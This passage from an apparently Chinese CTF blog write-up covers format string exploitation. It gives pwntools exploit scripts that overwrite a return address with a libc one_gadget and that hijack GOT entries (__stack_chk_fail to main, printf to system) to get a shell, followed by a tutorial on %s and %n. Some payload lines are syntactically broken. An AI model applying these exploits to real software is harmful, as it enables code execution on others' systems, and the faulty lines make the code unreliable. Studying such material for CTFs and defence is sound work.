class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 准备 one_gadget 并进行第二次格式化字符串写入 ================</span></span><br><span class="line">one_gadgets = [<span class="number">0xE3AFE</span>, <span class="number">0xE3B01</span>, <span class="number">0xE3B04</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串写入 gadget 地址（分两次写入两个 16 位）</span></span><br><span class="line">low = one_gadget &amp; <span class="number">0xFFFF</span></span><br><span class="line">high = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;low&#125;</span>c%10$hn&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;(high - low) &amp; <span class="number">0xFFFF</span>&#125;</span>c%11$hn&quot;</span>.encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上写入两个地址：分别写入 gadget 地址的低位和高位</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span>)        <span class="comment"># 返回地址所在栈偏移</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span> + <span class="number">2</span>)    <span class="comment"># +2 写入高位部分</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 获取 Flag ================</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;cat f*&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>          <span class="comment">#hex(4669) = 0x123d --&gt;read地址的后两字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                <span class="comment">#泄露libc_start_main+地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment">#p64(stack_addr - 8)----&gt;printf的返回地址</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png" alt="1"></p>
<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.0.png" alt="1"></p>
<p>可以看到0x7fffffffdd08 &#x3D; 0x7fffffffdd10 - 0x08从而定位printf_ret的地址。</p>
<p>然后我们可以看到libc_start_main+122的地址在栈上的位置；</p>
<p>0x7fffffffdd78 - 0x7fffffffdd10 &#x3D; 104，104&#x2F;8  &#x3D; 13，此时我们用%19$p就可以泄露出libc_start_main+122的地址，再减去122就可以得到</p>
<p>libc_start_main地址，再用libc_start_main减去偏移就可以得到基地地址了。</p>
<p>然后再%4669c%11$hn进行两字节的写入。将printf_ret的地址改成read的地址。</p>
<p>用one_gdaget命令查execve(&#x2F;bin&#x2F;sh)的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ one_gadget libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0xE3AFE</span>, <span class="number">0xE3B01</span>, <span class="number">0xE3B04</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串写入 gadget 地址（分两次写入两个 16 位）</span></span><br><span class="line">low = one_gadget &amp; <span class="number">0xFFFF</span>   <span class="comment">#低16位的两个字节</span></span><br><span class="line">high = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>  <span class="comment">#高16位的两个字节</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;low&#125;</span>c%10$hn&quot;</span>.encode()  <span class="comment">#把低16位的两个字节写入偏移为10的位置</span></span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;(high - low) &amp; <span class="number">0xFFFF</span>&#125;</span>c%11$hn&quot;</span>.encode()  <span class="comment">#把高16位的两个字节写入偏移为11的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上写入两个地址：分别写入 gadget 地址的低位和高位</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span>)        <span class="comment"># 返回地址所在栈偏移  偏移为10的位置</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span> + <span class="number">2</span>)    <span class="comment"># +2 写入高位部分 偏移为11的位置</span></span><br></pre></td></tr></table></figure>

<p>注释：11是怎么算出来的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ ./pwn</span><br><span class="line">Welcome TGCTF!</span><br><span class="line">your gift 0x7ffeec1ae9c0</span><br><span class="line">please tell me your name</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffeec1ae9c0 0x30 0x7c484851ba61 0x18 (nil) 0x2070252061616161 0x7025207025207025 0x2520702520702520 0xa70252070252070</span><br></pre></td></tr></table></figure>

<p>偏移是6,0x28&#x2F;8 &#x3D; 5，5 + 6 &#x3D;11；</p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>写完这题就来总结一下格式化字符串的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))init)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x110u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);   <span class="comment">//只有唯一的一个格式化字符串的漏洞，所以我们要构造一个循环</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040121B ; __unwind &#123;</span><br><span class="line">.text:000000000040121B                 endbr64</span><br><span class="line">.text:000000000040121F                 push    rbp</span><br><span class="line">.text:0000000000401220                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401223                 sub     rsp, 110h</span><br><span class="line">.text:000000000040122A                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000401233                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000401237                 xor     eax, eax</span><br><span class="line">.text:0000000000401239                 mov     eax, 0</span><br><span class="line">.text:000000000040123E                 call    init</span><br><span class="line">.text:0000000000401243                 lea     rax, s          ; &quot;-----&quot;</span><br><span class="line">.text:000000000040124A                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040124D                 call    _puts</span><br><span class="line">.text:0000000000401252                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401259                 mov     edx, 110h       ; nbytes</span><br><span class="line">.text:000000000040125E                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401261                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401266                 call    _read</span><br><span class="line">.text:000000000040126B                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401272                 mov     rdi, rax        ; format</span><br><span class="line">.text:0000000000401275                 mov     eax, 0</span><br><span class="line">.text:000000000040127A                 call    _printf</span><br><span class="line">.text:000000000040127F                 mov     eax, 0</span><br><span class="line">.text:0000000000401284                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:0000000000401288                 sub     rdx, fs:28h</span><br><span class="line">.text:0000000000401291                 jz      short locret_401298</span><br><span class="line">.text:0000000000401293                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>我们看到了call    ___stack_chk_fail，这个是关键。</p>
<p>为什么会有这个呢?  —–&gt;因为开启了canary</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      No RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br><span class="line">Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>查看保护，开启了canary。</p>
<p>利用格式化字符串的任意位置的篡改，我们就可以将 ___stack_chk_fail篡改为main的地址，这样就会进入无限循环</p>
<p>我们先去找到main和___stack_chk_fail的got地址，在篡改的同时还可以利用printf_got泄露printf的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">main_addr = <span class="number">0x40121b</span></span><br><span class="line">stack_chk_fail_got = <span class="number">0x0403320</span></span><br><span class="line">printf_got = <span class="number">0x403328</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode + <span class="string">b&#x27;%c22%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x1b</span>)+(<span class="number">0x12</span>).encode + <span class="string">b&#x27;%c23%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x12</span>)+(<span class="number">0x40</span>).encode + <span class="string">b&#x27;%c24%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span> <span class="comment">#方便接收</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x80/8 = 16 + 6(偏移见下图) = 22</span></span><br><span class="line">payload += p64(stack_chk_fail_got)       <span class="comment"># %$hhn是单字节写入 stack_chk_fail_got是%c22%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x1</span>) <span class="comment"># stack_chk_fail_got + 0x1是%c23%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x2</span>) <span class="comment"># stack_chk_fail_got + 0x2是%c24%$hhn写入的地址</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffcf57781d0 0x110 0x7a8a8171ba61 0x5 0x7a8a81904380 0x2070252061616161 0x7025207025207025 0x2520702520702520</span><br><span class="line">#偏移为6</span><br></pre></td></tr></table></figure>

<p>执行这个payload就进入无限循环了，并且泄漏量printf的地址。</p>
<p>根据print的地址，计算出libc的基地址。</p>
<p>此时我就要再次利用格式化字符串，将printf_got的地址改成system的地址，在发送&#x2F;bin&#x2F;sh就能获取shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;---b&quot;</span>)  </span><br><span class="line">printf_addr = u64(io.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)  <span class="comment">#接收printf的地址</span></span><br><span class="line">success(<span class="string">f&quot;printf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#计算基地址</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#算出system的地址</span></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&quot;c%22$hhn&quot;</span> <span class="comment">#最低字节写入偏移为的位置</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (system &amp; <span class="number">0xff</span>)) + ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&quot;c%23$hhn&quot;</span> <span class="comment">#同理去高一位的字节</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span> <span class="comment">#同理</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got) <span class="comment">#c%22$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x1</span>) <span class="comment">#c%23$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x2</span>) <span class="comment">#c%24$hhn写入的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)              </span><br><span class="line"><span class="comment">#io = remote(&#x27;ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x40121b</span></span><br><span class="line">stack_chk_fail_got = <span class="number">0x0403320</span></span><br><span class="line">printf_got = <span class="number">0x403328</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode + <span class="string">b&#x27;%c22%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x1b</span>)+(<span class="number">0x12</span>).encode + <span class="string">b&#x27;%c23%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x12</span>)+(<span class="number">0x40</span>).encode + <span class="string">b&#x27;%c24%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span> <span class="comment">#方便接收</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x80/8 = 16 + 6(偏移见下图) = 22</span></span><br><span class="line">payload += p64(stack_chk_fail_got)       <span class="comment"># %$hhn是单字节写入 stack_chk_fail_got是%c22%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x1</span>) <span class="comment"># stack_chk_fail_got + 0x1是%c23%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x2</span>) <span class="comment"># stack_chk_fail_got + 0x2是%c24%$hhn写入的地址</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;---b&quot;</span>)  </span><br><span class="line">printf_addr = u64(io.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)  <span class="comment">#接收printf的地址</span></span><br><span class="line">success(<span class="string">f&quot;printf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#计算基地址</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#算出system的地址</span></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&quot;c%22$hhn&quot;</span> <span class="comment">#最低字节写入偏移为的位置</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (system &amp; <span class="number">0xff</span>)) + ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&quot;c%23$hhn&quot;</span> <span class="comment">#同理去高一位的字节</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span> <span class="comment">#同理</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got) <span class="comment">#c%22$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x1</span>) <span class="comment">#c%23$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x2</span>) <span class="comment">#c%24$hhn写入的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>现在开始格式化字符串漏洞的知识点的总结。</p>
<p>什么是格式化字符串？</p>
<ul>
<li>在 C&#x2F;C++ 等语言中，像 <code>printf</code>, <code>sprintf</code>, <code>fprintf</code>, <code>syslog</code> 等函数使用一个格式化字符串作为第一个参数。这个字符串包含普通文本和以 <code>%</code> 开头的格式化说明符。</li>
<li>函数根据格式化说明符的指示，从后续的参数列表中读取相应数量和类型的参数，并将它们格式化后输出到目标（屏幕、字符串、文件等）。</li>
</ul>
<p>漏洞成因：</p>
<ul>
<li>程序员错误： 当程序员允许用户输入直接作为格式化字符串传递给这些格式化输出函数时，漏洞就产生了。</li>
<li>关键区别：<ul>
<li>正确用法： <code>printf(&quot;%s&quot;, user_input);</code> - 用户输入被当作一个普通的字符串参数传递给 <code>%s</code>。函数期望一个字符串地址作为第二个参数。</li>
<li>漏洞用法： <code>printf(user_input);</code> - 用户输入本身被当作格式化字符串。如果用户输入中包含 <code>%</code> 开头的字符序列，函数会将其解释为格式化说明符。</li>
</ul>
</li>
<li>函数行为： 当遇到格式化说明符时，函数会假设在栈（或寄存器，取决于调用约定）上存在对应的参数。它就会按照格式化说明符的要求去读取内存中它“认为”是参数的位置。</li>
</ul>
<p>漏洞危害：</p>
<ul>
<li>信息泄露 (Read)：读取栈内存、函数返回地址、库函数地址、程序代码地址、Canary值、甚至任意地址的内容（如密码、密钥）。</li>
<li>内存覆写 (Write)：向栈内存、函数返回地址、全局偏移表 (GOT)、析构函数表 (DTORS)、任意地址写入数据，从而劫持程序控制流（执行任意代码）。</li>
<li>程序崩溃： 读取或写入无效地址导致段错误。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">%s - 字符串读取 (Read)</span><br><span class="line"></span><br><span class="line">功能： 期望一个指针（地址）作为参数。函数从该地址开始读取内存，直到遇到空字符 (\0)，并将读取到的字节作为字符串输出。</span><br><span class="line"></span><br><span class="line">漏洞利用 (信息泄露)：</span><br><span class="line"></span><br><span class="line">泄露栈内容： printf(&quot;%s&quot;); - 函数会试图将当前栈上“它认为”是参数的位置（通常是格式化字符串指针后面的位置）解释为一个指针，并尝</span><br><span class="line"></span><br><span class="line">试读取该指针指向的内存。如果这个位置恰好包含一个有效的（或可读的）地址，就能泄露该地址处的字符串。例如：</span><br><span class="line"></span><br><span class="line">用户输入 &quot;%s&quot; -&gt; 程序崩溃或泄露栈上某个地址处的数据。</span><br><span class="line"></span><br><span class="line">用户输入 &quot;AAAA%x%x%x%s&quot; -&gt; 先泄露几个栈值 (%x)，然后用其中一个值作为指针 (%s) 去读内存。</span><br><span class="line"></span><br><span class="line">泄露任意地址内容 (结合偏移)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;格式化字符串&gt;</span><br><span class="line"></span><br><span class="line">利用 %k$s (其中 k 是偏移量) 指定将栈上第 k 个参数当作指针，用 %s 去读取。例如：</span><br><span class="line"></span><br><span class="line">假设 &lt;目标地址&gt; 被放置在栈上第 8 个参数的位置。</span><br><span class="line"></span><br><span class="line">Payload: &quot;\x78\x56\x34\x12%8$s&quot; (假设 0x12345678 是目标地址，小端序写入)。</span><br><span class="line"></span><br><span class="line">printf 看到 %8$s，就会把栈上第 8 个位置的值 0x12345678 当作指针，读取该地址处的字符串并输出。</span><br><span class="line"></span><br><span class="line">关键点： %s 是读取目标地址指向的内存内容（直到 \0），不是读取地址本身的值。地址本身通常需要用 %p 或 %x 泄露。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">%n - 写入已打印字符数 (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 int *（指向整数的指针）作为参数。该功能是漏洞实现任意地址写的核心！ 函数将到目前为止已成功输出的字符总数写入到</span><br><span class="line">这个指针指向的内存位置。</span><br><span class="line"></span><br><span class="line">漏洞利用 (内存覆写)：</span><br><span class="line"></span><br><span class="line">覆写栈变量/指针/返回地址： printf(&quot;AAAA%n&quot;); - 函数试图将已打印的字符数 (4个 A，所以是4) 写入到栈上“它认为”是参数的位置（本</span><br><span class="line">该是一个 int * 